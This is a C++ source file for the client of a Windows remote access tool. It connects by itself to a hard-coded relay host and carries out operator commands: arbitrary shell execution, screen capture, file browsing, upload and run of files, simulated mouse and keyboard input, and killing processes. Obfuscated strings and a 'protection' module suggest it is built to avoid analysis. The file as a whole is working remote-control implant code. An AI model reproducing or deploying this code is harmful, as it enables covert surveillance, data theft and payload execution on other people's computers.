// ═══════════════════════════════════════════════════════════════════
//  CLIENT — ImGui GUI, auto-connects to relay, executes commands
//
//  Commands: BrowseFiles | SystemInfo | ViewScreen | Execute
// ═══════════════════════════════════════════════════════════════════
#include <winsock2.h>
#include <ws2tcpip.h>

#include "imgui_setup.h"
#include "wswin.h"
#include "protocol.h"
#include "protection.h"

#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <intrin.h>
#include <string>
#include <vector>
#include <mutex>
#include <atomic>
#include <cstring>
#include <cstdio>
#include <memory>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "winmm.lib")

// ── Change this to your OnRender relay URL ──────────────────────────
#ifndef DEFAULT_RELAY_HOST
  #define DEFAULT_RELAY_HOST "serverandclient-mkzb.onrender.com"
#endif
#ifndef DEFAULT_RELAY_PORT
  #define DEFAULT_RELAY_PORT 443
#endif

// ── State ───────────────────────────────────────────────────────────
static char g_hostBuf[256] = DEFAULT_RELAY_HOST;
static int  g_port         = DEFAULT_RELAY_PORT;
static char g_nameBuf[128] = "Client";
static ws::SocketT g_sock = ws::INVALID;
static std::atomic<bool> g_connected{false};
static uint32_t g_clientId = 0;
static ws::Receiver g_receiver;

// Auto-connect
static bool  g_autoConnect   = true;
static float g_connectDelay   = 2.0f;
static bool  g_firstFrame     = true;

// Log
static std::mutex g_logMutex;
static std::vector<std::string> g_log;
static bool g_logDirty = false;

// GDI+
static ULONG_PTR g_gdiplusToken = 0;

// ── Log helper ──────────────────────────────────────────────────────
static void addLog(const char* fmt, ...) {
    char buf[512];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    std::lock_guard<std::mutex> lk(g_logMutex);
    g_log.push_back(buf);
    if (g_log.size() > 200) g_log.erase(g_log.begin());
    g_logDirty = true;
}

// ── Encoder CLSID lookup ───────────────────────────────────────────
static bool getEncoderClsid(const wchar_t* mimeType, CLSID* outClsid) {
    UINT num = 0, size = 0;
    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return false;
    auto* enc = (Gdiplus::ImageCodecInfo*)malloc(size);
    if (!enc) return false;
    Gdiplus::GetImageEncoders(num, size, enc);
    bool found = false;
    for (UINT i = 0; i < num; i++) {
        if (wcscmp(enc[i].MimeType, mimeType) == 0) {
            *outClsid = enc[i].Clsid;
            found = true;
            break;
        }
    }
    free(enc);
    return found;
}

// ── Command: Browse Files ──────────────────────────────────────────
struct Entry { bool isDir; uint64_t size; std::string name; };

static void cmdBrowseFiles(const std::string& path, std::vector<uint8_t>& out) {
    std::string search = path;
    if (!search.empty() && search.back() != '\\' && search.back() != '/')
        search += '\\';
    search += '*';

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);

    std::vector<Entry> entries;
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::string name = fd.cFileName;
            if (name == ".") continue;
            bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
            uint64_t sz = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
            entries.push_back({isDir, sz, std::move(name)});
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }

    proto::Writer w;
    w.u32((uint32_t)entries.size());
    for (auto& e : entries) {
        w.u8(e.isDir ? 1 : 0);
        w.u64(e.size);
        w.str(e.name);
    }
    out = w.bytes();
}

// ── Command: System Info ───────────────────────────────────────────
static void cmdSystemInfo(std::vector<uint8_t>& out) {
    std::string info;
    char buf[256];

    // Computer name
    char computer[MAX_COMPUTERNAME_LENGTH + 1] = {};
    DWORD sz = sizeof(computer);
    GetComputerNameA(computer, &sz);
    info += "Computer Name: "; info += computer; info += "\n";

    // User name
    char user[256] = {};
    sz = sizeof(user);
    GetUserNameA(user, &sz);
    info += "User Name: "; info += user; info += "\n";

    // OS version via RtlGetVersion (not affected by manifest lies)
    HMODULE ntdll = GetModuleHandleW(OBFW(L"ntdll.dll").c_str());
    auto RtlGetVersion = (LONG(WINAPI*)(OSVERSIONINFOEXW*))
        GetProcAddress(ntdll, OBF("RtlGetVersion").c_str());
    OSVERSIONINFOEXW osi = {};
    osi.dwOSVersionInfoSize = sizeof(osi);
    if (RtlGetVersion) RtlGetVersion(&osi);
    snprintf(buf, sizeof(buf), "OS: Windows %lu.%lu.%lu\n",
             osi.dwMajorVersion, osi.dwMinorVersion, osi.dwBuildNumber);
    info += buf;

    // CPU brand
    int cpu[4] = {};
    char brand[49] = {};
    __cpuid(cpu, 0x80000002); memcpy(brand,      cpu, 16);
    __cpuid(cpu, 0x80000003); memcpy(brand + 16, cpu, 16);
    __cpuid(cpu, 0x80000004); memcpy(brand + 32, cpu, 16);
    brand[48] = 0;
    char* p = brand; while (*p == ' ') p++;
    info += "CPU: "; info += p; info += "\n";

    // Cores
    SYSTEM_INFO si = {};
    GetSystemInfo(&si);
    snprintf(buf, sizeof(buf), "Processor Cores: %lu\n", si.dwNumberOfProcessors);
    info += buf;

    // Memory
    MEMORYSTATUSEX mi = {};
    mi.dwLength = sizeof(mi);
    GlobalMemoryStatusEx(&mi);
    snprintf(buf, sizeof(buf), "Total Memory: %llu MB\n",
             (unsigned long long)(mi.ullTotalPhys / (1024 * 1024)));
    info += buf;
    snprintf(buf, sizeof(buf), "Available Memory: %llu MB\n",
             (unsigned long long)(mi.ullAvailPhys / (1024 * 1024)));
    info += buf;

    // Screen resolution
    snprintf(buf, sizeof(buf), "Screen Resolution: %dx%d\n",
             GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
    info += buf;

    // Local IP
    char hostname[256] = {};
    gethostname(hostname, sizeof(hostname));
    struct addrinfo hints = {};
    hints.ai_family = AF_INET;
    struct addrinfo* res = nullptr;
    if (getaddrinfo(hostname, nullptr, &hints, &res) == 0 && res) {
        char ipStr[INET_ADDRSTRLEN] = {};
        auto* sa = (struct sockaddr_in*)res->ai_addr;
        inet_ntop(AF_INET, &sa->sin_addr, ipStr, sizeof(ipStr));
        snprintf(buf, sizeof(buf), "Local IP: %s\n", ipStr);
        info += buf;
        freeaddrinfo(res);
    } else {
        info += "Local IP: unknown\n";
    }

    proto::Writer w;
    w.str(info);
    out = w.bytes();
}

// ── Command: View Screen (capture → JPEG/PNG) ─────────────────────
static void cmdViewScreen(std::vector<uint8_t>& out) {
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    if (w <= 0 || h <= 0) {
        addLog("[!] ViewScreen: invalid screen size %dx%d", w, h);
        proto::Writer wr;
        wr.str("Error: invalid screen size");
        out = wr.bytes();
        return;
    }

    // Capture screen via BitBlt into a DDB
    HDC screenDC = GetDC(nullptr);
    HDC memDC    = CreateCompatibleDC(screenDC);
    HBITMAP hBmp = CreateCompatibleBitmap(screenDC, w, h);
    HBITMAP old  = (HBITMAP)SelectObject(memDC, hBmp);
    BitBlt(memDC, 0, 0, w, h, screenDC, 0, 0, SRCCOPY);
    SelectObject(memDC, old);

    // Wrap the HBITMAP in a GDI+ Bitmap (FromHBITMAP makes a copy)
    std::unique_ptr<Gdiplus::Bitmap> bmp(Gdiplus::Bitmap::FromHBITMAP(hBmp, nullptr));
    DeleteObject(hBmp);
    DeleteDC(memDC);
    ReleaseDC(nullptr, screenDC);

    if (!bmp || bmp->GetLastStatus() != Gdiplus::Ok) {
        addLog("[!] ViewScreen: FromHBITMAP failed");
        proto::Writer wr;
        wr.str("Error: FromHBITMAP failed");
        out = wr.bytes();
        return;
    }

    // Create IStream to hold the encoded image
    IStream* stream = nullptr;
    HRESULT hr = CreateStreamOnHGlobal(nullptr, TRUE, &stream);
    if (FAILED(hr) || !stream) {
        addLog("[!] ViewScreen: CreateStreamOnHGlobal failed");
        proto::Writer wr;
        wr.str("Error: CreateStreamOnHGlobal failed");
        out = wr.bytes();
        return;
    }

    // Try JPEG first, then PNG fallback
    CLSID encClsid = {};
    bool saved = false;

    if (getEncoderClsid(OBFW(L"image/jpeg").c_str(), &encClsid)) {
        Gdiplus::EncoderParameters params;
        params.Count = 1;
        params.Parameter[0].Guid  = Gdiplus::EncoderQuality;
        params.Parameter[0].Type = Gdiplus::EncoderParameterValueTypeLong;
        ULONG quality = 50;
        params.Parameter[0].Value = &quality;

        Gdiplus::Status st = bmp->Save(stream, &encClsid, &params);
        if (st == Gdiplus::Ok) {
            saved = true;
            addLog("[>] ViewScreen: saved as JPEG");
        } else {
            addLog("[!] ViewScreen: JPEG save failed (status=%d), trying PNG", (int)st);
        }
    }

    if (!saved) {
        LARGE_INTEGER zero = {};
        stream->Seek(zero, STREAM_SEEK_SET, nullptr);

        if (getEncoderClsid(OBFW(L"image/png").c_str(), &encClsid)) {
            Gdiplus::Status st = bmp->Save(stream, &encClsid, nullptr);
            if (st == Gdiplus::Ok) {
                saved = true;
                addLog("[>] ViewScreen: saved as PNG");
            } else {
                addLog("[!] ViewScreen: PNG save also failed (status=%d)", (int)st);
            }
        }
    }

    if (saved) {
        STATSTG stat = {};
        stream->Stat(&stat, STATFLAG_NONAME);
        size_t imgSize = (size_t)stat.cbSize.QuadPart;
        if (imgSize > 0) {
            LARGE_INTEGER zero = {};
            stream->Seek(zero, STREAM_SEEK_SET, nullptr);
            out.resize(imgSize);
            ULONG read = 0;
            stream->Read(out.data(), (ULONG)imgSize, &read);
            addLog("[>] ViewScreen: %zu bytes sent", imgSize);
        }
    } else {
        proto::Writer wr;
        wr.str("Error: no image encoder available");
        out = wr.bytes();
        addLog("[!] ViewScreen: no encoder available");
    }

    stream->Release();
}

// ── Command: Execute ────────────────────────────────────────────────
static void cmdExecute(const std::string& cmd, std::vector<uint8_t>& out) {
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) {
        proto::Writer w;
        w.str("Failed to execute command");
        out = w.bytes();
        return;
    }
    std::string output;
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe))
        output += buffer;
    _pclose(pipe);

    proto::Writer w;
    w.str(output);
    out = w.bytes();
}

// ── Command: Mouse Click ───────────────────────────────────────────
static void cmdMouseClick(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    uint32_t x, y; uint8_t button;
    if (!r.u32(x) || !r.u32(y) || !r.u8(button)) {
        proto::Writer w; w.str("Bad payload"); out = w.bytes(); return;
    }
    addLog("[>] Mouse: %u,%u btn=%u", x, y, button);

    SetCursorPos(x, y);
    if (button == 0) { // left click
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    } else if (button == 1) { // right click
        mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
    } else if (button == 2) { // double click
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    }
    proto::Writer w; w.str("OK"); out = w.bytes();
}

// ── Command: Key Input ─────────────────────────────────────────────
static void cmdKeyInput(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    std::string text;
    r.str(text);
    addLog("[>] Keys: %zu chars", text.size());

    // Type each character using SendInput
    for (char c : text) {
        INPUT input = {};
        input.type = INPUT_KEYBOARD;
        input.ki.wScan = c;
        input.ki.dwFlags = KEYEVENTF_UNICODE;
        SendInput(1, &input, sizeof(INPUT));
        input.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
        SendInput(1, &input, sizeof(INPUT));
    }
    proto::Writer w; w.str("OK"); out = w.bytes();
}

// ── Command: File Upload ───────────────────────────────────────────
static void cmdFileUpload(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    std::string filename;
    if (!r.str(filename)) {
        proto::Writer w; w.str("Bad filename"); out = w.bytes(); return;
    }
    // Remaining bytes are file data
    size_t dataOffset = payload.size() - r.remaining();
    const uint8_t* fileData = payload.data() + dataOffset;
    size_t fileSize = r.remaining();

    // Save to temp dir
    char path[MAX_PATH];
    GetTempPathA(MAX_PATH, path);
    strcat_s(path, filename.c_str());

    FILE* f = nullptr;
    fopen_s(&f, path, "wb");
    if (!f) {
        proto::Writer w; w.str("Cannot write file"); out = w.bytes(); return;
    }
    fwrite(fileData, 1, fileSize, f);
    fclose(f);

    addLog("[>] File received: %s (%zu bytes) -> %s", filename.c_str(), fileSize, path);
    proto::Writer w; w.str(path); out = w.bytes();
}

// ── Command: Run File ──────────────────────────────────────────────
static void cmdRunFile(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    std::string path;
    r.str(path);
    addLog("[>] Run file: %s", path.c_str());

    HINSTANCE h = ShellExecuteA(nullptr, "open", path.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
    if ((intptr_t)h <= 32) {
        proto::Writer w; w.str("Failed to run file"); out = w.bytes();
    } else {
        proto::Writer w; w.str("OK"); out = w.bytes();
    }
}

// ── Command: Process List ──────────────────────────────────────────
static void cmdProcessList(std::vector<uint8_t>& out) {
    addLog("[>] Process list requested");

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        proto::Writer w; w.str("Error: Cannot create snapshot"); out = w.bytes(); return;
    }

    PROCESSENTRY32 pe = {};
    pe.dwSize = sizeof(pe);

    proto::Writer w;
    uint32_t count = 0;
    // First pass: count processes
    if (Process32First(snap, &pe)) {
        do { count++; } while (Process32Next(snap, &pe));
    }
    w.u32(count);

    // Second pass: write data
    if (Process32First(snap, &pe)) {
        do {
            w.u32(pe.th32ProcessID);
            // Get process name as wide->narrow
            char name[260] = {};
            WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
            w.str(std::string(name));
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);

    out = w.bytes();
    addLog("[<] Process list: %u processes", count);
}

// ── Command: Kill Process ──────────────────────────────────────────
static void cmdKillProcess(const std::vector<uint8_t>& payload, std::vector<uint8_t>& out) {
    proto::Reader r(payload.data(), payload.size());
    uint32_t pid;
    if (!r.u32(pid)) {
        proto::Writer w; w.str("Bad PID"); out = w.bytes(); return;
    }
    addLog("[>] Kill process: %u", pid);

    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProc) {
        char buf[128];
        snprintf(buf, sizeof(buf), "Error: OpenProcess failed (%lu)", GetLastError());
        proto::Writer w; w.str(buf); out = w.bytes(); return;
    }
    BOOL ok = TerminateProcess(hProc, 1);
    CloseHandle(hProc);

    if (ok) {
        proto::Writer w; w.str("OK"); out = w.bytes();
        addLog("[<] Process %u terminated", pid);
    } else {
        char buf[128];
        snprintf(buf, sizeof(buf), "Error: TerminateProcess failed (%lu)", GetLastError());
        proto::Writer w; w.str(buf); out = w.bytes();
    }
}

// ── Message handler (receiver thread) ───────────────────────────────
static void onMessage(uint8_t msgType, uint8_t cmdType, std::vector<uint8_t> payload) {
    if (msgType == 0) {
        g_connected = false;
        addLog("[!] Disconnected from relay");
        return;
    }
    if (msgType != proto::MSG_COMMAND) return;

    std::vector<uint8_t> resp;

    switch (cmdType) {
    case proto::CMD_BROWSE_FILES: {
        proto::Reader r(payload.data(), payload.size());
        std::string path;
        r.str(path);
        addLog("[>] Browse Files: %s", path.c_str());
        cmdBrowseFiles(path, resp);
        break;
    }
    case proto::CMD_SYSTEM_INFO:
        addLog("[>] System Info requested");
        cmdSystemInfo(resp);
        break;
    case proto::CMD_VIEW_SCREEN:
        addLog("[>] View Screen requested");
        cmdViewScreen(resp);
        break;
    case proto::CMD_EXECUTE: {
        proto::Reader r(payload.data(), payload.size());
        std::string cmd;
        r.str(cmd);
        addLog("[>] Execute: %s", cmd.c_str());
        cmdExecute(cmd, resp);
        break;
    }
    case proto::CMD_MOUSE_CLICK:
        cmdMouseClick(payload, resp);
        break;
    case proto::CMD_KEY_INPUT:
        cmdKeyInput(payload, resp);
        break;
    case proto::CMD_FILE_UPLOAD:
        cmdFileUpload(payload, resp);
        break;
    case proto::CMD_RUN_FILE:
        cmdRunFile(payload, resp);
        break;
    case proto::CMD_PROCESS_LIST:
        cmdProcessList(resp);
        break;
    case proto::CMD_KILL_PROCESS:
        cmdKillProcess(payload, resp);
        break;
    default:
        addLog("[?] Unknown command type: %d", cmdType);
        return;
    }

    auto msg = proto::buildMessage(proto::MSG_RESPONSE, cmdType, resp);
    ws::sendAll(g_sock, msg.data(), msg.size());
}

// ── Connect / Disconnect ───────────────────────────────────────────
static void doConnect() {
    if (g_sock != ws::INVALID) {
        g_receiver.stop();
        ws::close(g_sock);
        g_sock = ws::INVALID;
    }
    g_connected = false;

    g_sock = ws::connect(std::string(g_hostBuf), g_port);
    if (g_sock == ws::INVALID) {
        addLog("[!] Failed to connect to %s:%d", g_hostBuf, g_port);
        return;
    }

    // Send REGISTER(client, name)
    proto::Writer w;
    w.u8(proto::ROLE_CLIENT);
    w.str(std::string(g_nameBuf));
    auto msg = proto::buildMessage(proto::MSG_REGISTER, 0, w.bytes());
    if (!ws::sendAll(g_sock, msg.data(), msg.size())) {
        ws::close(g_sock); g_sock = ws::INVALID;
        addLog("[!] Failed to send register");
        return;
    }

    // Receive assigned ID (blocking, before receiver thread)
    uint8_t msgType, cmdType;
    std::vector<uint8_t> payload;
    if (!ws::recvMessage(g_sock, msgType, cmdType, payload) ||
        msgType != proto::MSG_REGISTER)
    {
        ws::close(g_sock); g_sock = ws::INVALID;
        addLog("[!] Failed to receive register response");
        return;
    }

    proto::Reader r(payload.data(), payload.size());
    r.u32(g_clientId);

    g_connected = true;
    g_receiver.start(g_sock, onMessage);
    addLog("[+] Connected to relay %s:%d (ID: %u)", g_hostBuf, g_port, g_clientId);
}

static void doDisconnect() {
    g_receiver.stop();
    ws::close(g_sock);
    g_sock = ws::INVALID;
    g_connected = false;
    g_clientId = 0;
    addLog("[*] Disconnected");
}

// ── Draw callback ───────────────────────────────────────────────────
static void playClick() {
    PlaySoundW(L"click.wav", nullptr, SND_FILENAME | SND_ASYNC | SND_NODEFAULT);
}

static void onDraw() {
    ImGuiIO& io = ImGui::GetIO();

    PollProtection();

    // Play click sound on any mouse click
    if (ImGui::IsMouseClicked(0))
        playClick();

    // Auto-connect on launch
    if (g_firstFrame) {
        g_firstFrame = false;
        g_connectDelay = 2.0f;
    }
    if (g_autoConnect && !g_connected) {
        g_connectDelay -= io.DeltaTime;
        if (g_connectDelay <= 0.0f) {
            doConnect();
            g_connectDelay = 5.0f;  // retry every 5 s
        }
    }

    ImGui::SetNextWindowPos(ImVec2(0, 0));
    ImGui::SetNextWindowSize(io.DisplaySize);
    ImGui::Begin("Client - Remote Access", nullptr,
        ImGuiWindowFlags_NoTitleBar | ImGuiWindowFlags_NoResize |
        ImGuiWindowFlags_NoMove | ImGuiWindowFlags_NoCollapse |
        ImGuiWindowFlags_NoBringToFrontOnFocus);

    // Connection settings
    if (!g_connected) {
        ImGui::Text("Relay Host:");
        ImGui::SameLine();
        ImGui::SetNextItemWidth(250);
        ImGui::InputText("##host", g_hostBuf, sizeof(g_hostBuf));

        ImGui::Text("Port:");
        ImGui::SameLine();
        ImGui::SetNextItemWidth(80);
        ImGui::InputInt("##port", &g_port);

        ImGui::Text("Client Name:");
        ImGui::SameLine();
        ImGui::SetNextItemWidth(200);
        ImGui::InputText("##name", g_nameBuf, sizeof(g_nameBuf));

        ImGui::Checkbox("Auto-connect on launch", &g_autoConnect);

        if (ImGui::Button("Connect")) doConnect();
    } else {
        ImGui::Text("Relay: %s:%d", g_hostBuf, g_port);
        ImGui::Text("Client Name: %s (ID: %u)", g_nameBuf, g_clientId);
        if (ImGui::Button("Disconnect")) doDisconnect();
    }

    ImGui::SameLine();
    ImGui::TextColored(g_connected ? ImVec4(0, 1, 0, 1) : ImVec4(1, 0, 0, 1),
                       g_connected ? "● Connected" : "● Disconnected");

    if (g_autoConnect && !g_connected) {
        ImGui::TextColored(ImVec4(1, 1, 0, 1),
            "Auto-connect in %.1f s...", g_connectDelay);
    }

    ImGui::Separator();

    // Log
    ImGui::Text("Activity Log");
    ImGui::BeginChild("##log", ImVec2(0, 0), true);
    {
        std::lock_guard<std::mutex> lk(g_logMutex);
        for (auto& line : g_log)
            ImGui::TextUnformatted(line.c_str());
        if (g_logDirty) {
            ImGui::SetScrollHereY(1.0f);
            g_logDirty = false;
        }
    }
    ImGui::EndChild();

    ImGui::End();
}

// ── Main ────────────────────────────────────────────────────────────
int main() {
    // Use computer name as default client name
    DWORD sz = sizeof(g_nameBuf);
    GetComputerNameA(g_nameBuf, &sz);

    InitializeProtection();
    Gdiplus::GdiplusStartupInput gdiInput;
    Gdiplus::GdiplusStartup(&g_gdiplusToken, &gdiInput, nullptr);
    ws::init();

    int ret = imguiRun(L"Client - Remote Access", 600, 500, nullptr, onDraw);

    if (g_connected) doDisconnect();
    Gdiplus::GdiplusShutdown(g_gdiplusToken);
    ws::shutdown();
    return ret;
}
